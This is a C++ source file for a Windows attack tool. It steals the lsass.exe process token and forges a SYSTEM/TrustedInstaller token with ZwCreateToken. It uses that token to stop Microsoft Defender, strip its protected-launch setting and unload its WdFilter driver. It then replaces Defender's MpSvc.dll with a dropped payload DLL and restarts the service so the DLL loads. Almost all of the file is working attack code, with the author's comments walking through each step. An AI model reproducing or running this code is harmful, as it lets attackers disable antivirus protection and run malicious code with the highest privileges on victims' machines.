#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <sddl.h>
#include <Lm.h>
#include <assert.h>
#include <tchar.h>
#include <conio.h>
#include <TlHelp32.h>
#include <iostream>
#include <PathCch.h>
#include <psapi.h>
#pragma comment(lib,"winsta.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"PathCch.lib")
#define SystemHandleInformation 16
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
void GetUser()
{
	TCHAR  buffer[64];
	DWORD k = 64;
	GetUserName(buffer, &k);
	printf("[i] user=%S\n", buffer);
}
typedef unsigned __int64 QWORD;


typedef struct _SID_BUILTIN
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[2];
} SID_BUILTIN, * PSID_BUILTIN;


typedef struct _SID_INTEGRITY
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[1];
} SID_INTEGRITY, * PSID_INTEGRITY;


typedef NTSYSAPI NTSTATUS(NTAPI* _ZwCreateToken)(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE Type,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER User,
	IN PTOKEN_GROUPS Groups,
	IN PTOKEN_PRIVILEGES Privileges,
	IN PTOKEN_OWNER Owner,
	IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
	IN PTOKEN_DEFAULT_DACL DefaultDacl,
	IN PTOKEN_SOURCE Source
	);


typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	ULONG       ProcessId;
	UCHAR       ObjectTypeNumber;
	UCHAR       Flags;
	USHORT      Handle;
	QWORD       Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;


typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);
PTOKEN_PRIVILEGES SetPrivileges()
{
	PTOKEN_PRIVILEGES   privileges;
	LUID                luid;
	int                 NumOfPrivileges = 4;
	int                 nBufferSize;


	nBufferSize = sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES) * NumOfPrivileges;
	privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, nBufferSize);

	privileges->PrivilegeCount = NumOfPrivileges;

	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[0].Luid = luid;

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[1].Luid = luid;

	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[2].Luid = luid;



	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[3].Luid = luid;

	return privileges;
}

LPVOID GetInfoFromToken(HANDLE hToken, TOKEN_INFORMATION_CLASS type)
{
	DWORD    dwLengthNeeded;
	LPVOID   lpData = NULL;


	if (!GetTokenInformation(hToken, type, NULL, 0, &dwLengthNeeded) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		printf("\n[-] Failed to initialize GetTokenInformation %d", GetLastError());
		return NULL;
	}

	lpData = (LPVOID)LocalAlloc(LPTR, dwLengthNeeded);
	GetTokenInformation(hToken, type, lpData, dwLengthNeeded, &dwLengthNeeded);

	return lpData;
}
HRESULT GetSid(
	LPCWSTR wszAccName,
	PSID* ppSid
)
{

	// Validate the input parameters.  
	if (wszAccName == NULL || ppSid == NULL)
	{
		return ERROR_INVALID_PARAMETER;
	}

	// Create buffers that may be large enough.  
	// If a buffer is too small, the count parameter will be set to the size needed.  
	const DWORD INITIAL_SIZE = 32;
	DWORD cbSid = 0;
	DWORD dwSidBufferSize = INITIAL_SIZE;
	DWORD cchDomainName = 0;
	DWORD dwDomainBufferSize = INITIAL_SIZE;
	WCHAR* wszDomainName = NULL;
	SID_NAME_USE eSidType;
	DWORD dwErrorCode = 0;
	HRESULT hr = 1;

	// Create buffers for the SID and the domain name.  
	*ppSid = (PSID) new BYTE[dwSidBufferSize];
	if (*ppSid == NULL)
	{
		return -1;
	}
	memset(*ppSid, 0, dwSidBufferSize);
	wszDomainName = new WCHAR[dwDomainBufferSize];
	if (wszDomainName == NULL)
	{
		return -1;
	}
	memset(wszDomainName, 0, dwDomainBufferSize * sizeof(WCHAR));

	// Obtain the SID for the account name passed.  
	for (; ; )
	{

		// Set the count variables to the buffer sizes and retrieve the SID.  
		cbSid = dwSidBufferSize;
		cchDomainName = dwDomainBufferSize;
		if (LookupAccountNameW(
			NULL,            // Computer name. NULL for the local computer  
			wszAccName,
			*ppSid,          // Pointer to the SID buffer. Use NULL to get the size needed,  
			&cbSid,          // Size of the SID buffer needed.  
			wszDomainName,   // wszDomainName,  
			&cchDomainName,
			&eSidType
		))
		{
			if (IsValidSid(*ppSid) == FALSE)
			{
				wprintf(L"The SID for %s is invalid.\n", wszAccName);
				dwErrorCode = ERROR;
			}
			break;
		}
		dwErrorCode = GetLastError();

		// Check if one of the buffers was too small.  
		if (dwErrorCode == ERROR_INSUFFICIENT_BUFFER)
		{
			if (cbSid > dwSidBufferSize)
			{

				// Reallocate memory for the SID buffer.  
				wprintf(L"The SID buffer was too small. It will be reallocated.\n");
				FreeSid(*ppSid);
				*ppSid = (PSID) new BYTE[cbSid];
				if (*ppSid == NULL)
				{
					return -1;
				}
				memset(*ppSid, 0, cbSid);
				dwSidBufferSize = cbSid;
			}
			if (cchDomainName > dwDomainBufferSize)
			{

				// Reallocate memory for the domain name buffer.  
				wprintf(L"The domain name buffer was too small. It will be reallocated.\n");
				delete[] wszDomainName;
				wszDomainName = new WCHAR[cchDomainName];
				if (wszDomainName == NULL)
				{
					return -1;
				}
				memset(wszDomainName, 0, cchDomainName * sizeof(WCHAR));
				dwDomainBufferSize = cchDomainName;
			}
		}
		else
		{
			wprintf(L"LookupAccountNameW failed. GetLastError returned: %d\n", dwErrorCode);
			hr = HRESULT_FROM_WIN32(dwErrorCode);
			break;
		}
	}

	delete[] wszDomainName;
	return hr;
}
void
get_system_privileges(PTOKEN_PRIVILEGES privileges)
{

	LUID luid;
	privileges->PrivilegeCount = 4;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[0].Luid = luid;
	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[1].Luid = luid;
	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[2].Luid = luid;
	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[3].Luid = luid;


}
DWORD FindProcessByName(const wchar_t* pname) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			
			if (wcscmp(entry.szExeFile, pname) == 0)
			{
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);
	return 0;
}
HANDLE
CreateUserToken(HANDLE base_token, wchar_t* username)
{

	LUID luid;
	PLUID pluidAuth;
	NTSTATUS ntStatus;
	LARGE_INTEGER li;
	PLARGE_INTEGER pli;
	HANDLE elevated_token;
	PTOKEN_STATISTICS stats;
	PTOKEN_PRIVILEGES privileges;
	PTOKEN_OWNER owner;
	PTOKEN_PRIMARY_GROUP primary_group;
	PTOKEN_DEFAULT_DACL default_dacl;
	PTOKEN_GROUPS groups;
	SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityDelegation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	PSID_AND_ATTRIBUTES pSid;
	TOKEN_USER userToken;
	TOKEN_SOURCE sourceToken = { {'C', 'r', 'e', 'd', 'P', 'r', 'o', 0}, {0, 0} };  //{ { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };

	LUID authid = SYSTEM_LUID;
	
	_ZwCreateToken ZwCreateToken;
	PSID mysid;
	SID_BUILTIN TkSidLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, DOMAIN_ALIAS_RID_ADMINS } };
	SID_INTEGRITY IntegritySIDHigh = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_HIGH_RID };
	SID_INTEGRITY IntegritySIDSystem = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID };
	SID_INTEGRITY IntegritySIDMedium = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };

	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL) {
		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
		return NULL;
	}


	userToken.User.Attributes = 0;
	HRESULT hr = GetSid(username, &mysid);
	userToken.User.Sid = mysid;
	AllocateLocallyUniqueId(&luid);
	sourceToken.SourceIdentifier.LowPart = luid.LowPart;
	sourceToken.SourceIdentifier.HighPart = luid.HighPart;
	stats = (PTOKEN_STATISTICS)GetInfoFromToken(base_token, TokenStatistics);
	privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 4));
	get_system_privileges(privileges);
	PSID group1;
	// TrustedInstaller SID
	//BOOL t = ConvertStringSidToSidA("S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", &group2);
	PSID group2 = malloc(MAX_SID_SIZE);
	DWORD sid_sz = MAX_SID_SIZE;
	SID_NAME_USE type;
	WCHAR domain_name[4096];
	DWORD domain_name_sz = 4096;
	LookupAccountName(NULL, L"NT SERVICE\\TrustedInstaller", group2, &sid_sz, domain_name, &domain_name_sz, &type);
	// Local Admin SID
	BOOL t = ConvertStringSidToSidA("S-1-5-32-544", &group1);
	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);
	pSid = groups->Groups;

	for (int i = 0; i < groups->GroupCount; ++i, pSid++)
	{
		// change IL
		//if (pSid->Attributes & SE_GROUP_INTEGRITY)
		//	memcpy(pSid->Sid, &IntegritySIDMedium, sizeof(IntegritySIDMedium));

		PISID piSid = (PISID)pSid->Sid;
		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS) {
			pSid->Sid = group1;
			pSid->Attributes = SE_GROUP_MANDATORY;
		}


		else if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == SECURITY_WORLD_RID) {
			pSid->Sid = group2;
			pSid->Attributes = SE_GROUP_MANDATORY;
		}
		else {
			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pSid->Attributes &= ~SE_GROUP_MANDATORY;
		}
	}

	owner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	owner->Owner = mysid;
	DWORD Size = 0;
	pluidAuth = &authid;
	li.LowPart = 0xFFFFFFFF;
	li.HighPart = 0xFFFFFFFF;
	pli = &li;
	
	ntStatus = ZwCreateToken(&elevated_token,
		TOKEN_ALL_ACCESS,
		&oa,
		TokenImpersonation,
		pluidAuth,
		pli,
		&userToken,
		groups,
		privileges,
		owner,
		primary_group,
		default_dacl,
		&sourceToken
	);


	if (ntStatus == STATUS_SUCCESS)
		return elevated_token;
	else
		printf("[-] Failed to create new token: %d %08x\n", GetLastError(), ntStatus);

	if (stats) LocalFree(stats);
	if (groups) LocalFree(groups);
	if (privileges) LocalFree(privileges);
	return NULL;
}

wchar_t defender_exe_path[MAX_PATH];
BOOL DoDropPayload() {

	wchar_t defender_dir[MAX_PATH];
	ExpandEnvironmentStrings(L"%ProgramData%\\Microsoft\\Windows Defender\\Platform", defender_dir, MAX_PATH);
	PathCchRemoveFileSpec(defender_exe_path, MAX_PATH);
	std::wstring dll_dir_dir = defender_dir;
	std::wstring dll_drop_dir = defender_exe_path;
	dll_dir_dir.append(L"\\5.19.2107.8-0");
	CreateDirectory(dll_dir_dir.c_str(), NULL);
	dll_dir_dir.append(L"\\MpClient.dll");
	CreateDirectory(dll_dir_dir.c_str(), NULL);
	dll_drop_dir.append(L"\\MpSvc.dll");
	wchar_t mx[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), mx, MAX_PATH);
	PathCchRemoveFileSpec(mx, MAX_PATH);
	std::wstring src = mx;
	src.append(L"\\MpSvc.dll");
	return CopyFile(src.c_str(), dll_drop_dir.c_str(), FALSE);

	
}

int wmain() {
	DWORD pid = FindProcessByName(L"lsass.exe");
	if (pid == 0) {
		printf("[-] Failed to find lsass.exe pid :t");
		return ERROR_NOT_FOUND;
	}
	DWORD windefend_pid = FindProcessByName(L"MsMpEng.exe");

	if (windefend_pid == 0) {
		printf("[-] Failed to find MsMpEng.exe pid :!");
		return ERROR_NOT_FOUND;
	}
	HANDLE hwindefend = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, windefend_pid);
	printf("%d\n", GetLastError());
	if (hwindefend == NULL) {
		printf("[-] Failed to open MsMpEng process are you system ?");
		return 1;
	}
	printf("[#] Exploit Running, target MsMpEng.exe with PID:%d\n", windefend_pid);
	printf("[+] Found lsass.exe running with pid : %d\n", pid);
	printf("[!] Stealing lsass.exe token... ");
	
	HANDLE hlsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	HANDLE htoken1 = NULL;
	//why do I need the token from lsass ?
	//cause it contains SeCreateToken privilege enabled by default
	//while in the majority of ring 3 cases, you don't have it;
	OpenProcessToken(hlsass, TOKEN_ALL_ACCESS, &htoken1);
	CloseHandle(hlsass);
	if (!ImpersonateLoggedOnUser(htoken1)) {
		printf("\n[-] Failed to open lsass.exe token, are you system ?");
		return 1;
	}
	printf("Success.\n");
	printf("[+] Successfully impersonated token with SeCreateToken Privilege.\n");
	printf("[!] Attempting to create TrustedInstaller Token ... ");

	HANDLE hTokenCurrent = NULL;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrent);
	//now the next line might give you a question, why do I need ZwCreateToken for a TI token ?
	//simply cause I never used ZwCreateToken, and I really like calling NT API. Also, it's not much of my work
	//I stole a lot of code from this guy https://decoder.cloud/2019/07/04/creating-windows-access-tokens/
	HANDLE test = CreateUserToken(hTokenCurrent, (wchar_t*)L"NT AUTHORITY\\SYSTEM");
	
	//query some information, will be used later
	GetModuleFileNameExW(hwindefend, NULL, defender_exe_path, MAX_PATH);

	RevertToSelf();
	CloseHandle(hTokenCurrent);
	CloseHandle(htoken1);
	if (!ImpersonateLoggedOnUser(test)) {
		printf("\n[-] Failed to create TrustedInstaller Token :(");
		return 1;
	}
	printf("Done.\n");
	printf("[+] Succesfully created and impersonated TrustedInstaller Token.\n");
	printf("[!] Opening WinDefend service ... ");
	
	SC_HANDLE tt = OpenSCManager(NULL, NULL, GENERIC_READ);
	SC_HANDLE windefend_svc = OpenServiceW(tt, L"WinDefend", SERVICE_START | SERVICE_STOP | GENERIC_READ | SERVICE_CHANGE_CONFIG | SERVICE_USER_DEFINED_CONTROL);
	if (windefend_svc == NULL) {
		printf("\n[-] Failed to open WinDefend service, seems look like Microsoft won this time.");
		return 1;
	}
	printf("Done.\n");

	SERVICE_STATUS svc_status;
	if (!ControlService(windefend_svc, SERVICE_CONTROL_STOP, &svc_status)) {
		printf("[-] Failed to stop WinDefend service :(");
		return 1;
	}
	printf("[+] Successfully sent service stop control.\n");
	SERVICE_LAUNCH_PROTECTED_INFO info;
	DWORD ret_sz = 0;
	QueryServiceConfig2W(windefend_svc, SERVICE_CONFIG_LAUNCH_PROTECTED, (LPBYTE)&info, sizeof(SERVICE_LAUNCH_PROTECTED_INFO), &ret_sz);
	if (info.dwLaunchProtected == SERVICE_LAUNCH_PROTECTED_NONE)
		goto WaitDefender;
	info.dwLaunchProtected = SERVICE_LAUNCH_PROTECTED_NONE;
	if (!ChangeServiceConfig2W(windefend_svc, SERVICE_CONFIG_LAUNCH_PROTECTED, &info)) {
		printf("[-] Failed to remove PsProtectSignerAntimalware-Light from WinDefend service :(");
		return 1;
	}
	printf("[+] Successfully removed PsProtectSignerAntimalware-Light from WinDefend service.\n");
WaitDefender:
	printf("[*] Waiting WinDefend to stop .!\n");
	WaitForSingleObject(hwindefend, INFINITE);
	CloseHandle(hwindefend);
	printf("[!] Attempting to unload WdFilter.sys ... ");

	SC_HANDLE wdfilter_svc = OpenServiceW(tt, L"WdFilter", SERVICE_START | SERVICE_STOP | GENERIC_READ | SERVICE_CHANGE_CONFIG | SERVICE_USER_DEFINED_CONTROL);
	if (wdfilter_svc == NULL) {
		printf("\n[-] Failed to open WdFilter service, sad :(");
		return 1;
	}
	if (!ControlService(wdfilter_svc, SERVICE_CONTROL_STOP, &svc_status)) {
		printf("\n[-] Failed to unload WdFilter service :(");
		return 1;
	}
	printf("Done.\n");
	CloseServiceHandle(wdfilter_svc);
	printf("[!] Overwritting MpSvc.dll ... ");
	if (!DoDropPayload()) {
		printf("\n[-] Failed to overwrite MpSvc.dll");
		return 1;
	}
	printf("Success.\n");
	
	StartService(windefend_svc, NULL, NULL);
	printf("[+] Succesfully started WinDefend again !\n");
	CloseServiceHandle(windefend_svc);
	CloseServiceHandle(tt);
	RevertToSelf();
	CloseHandle(test);
	printf("[*] Dll must be loaded !\n");
	
	return 0;
}
